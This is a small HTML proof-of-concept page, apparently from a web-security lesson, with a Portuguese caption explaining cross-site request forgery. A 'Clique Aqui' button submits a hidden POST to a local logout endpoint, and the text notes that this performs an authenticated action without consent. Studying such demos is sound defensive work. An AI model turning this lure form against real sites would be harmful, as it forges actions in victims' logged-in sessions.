<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Vulnerability </title>

</head>

<body>
    
    <form action = "http://localhost:3000/api/logout" method = "POST">

        <button type = "submit">Clique Aqui</button>

    </form>

    <p>
        
        O form está definido com action = "http://localhost:3000/api/logout" method: "POST">, ou seja, 
    o navegador faz uma requisição POST para a rota /api/logout no backend. 
    
    Dessa maneira conseguimos realizar uma ação autenticada sem consentimento

    </p>

</body>

</html>
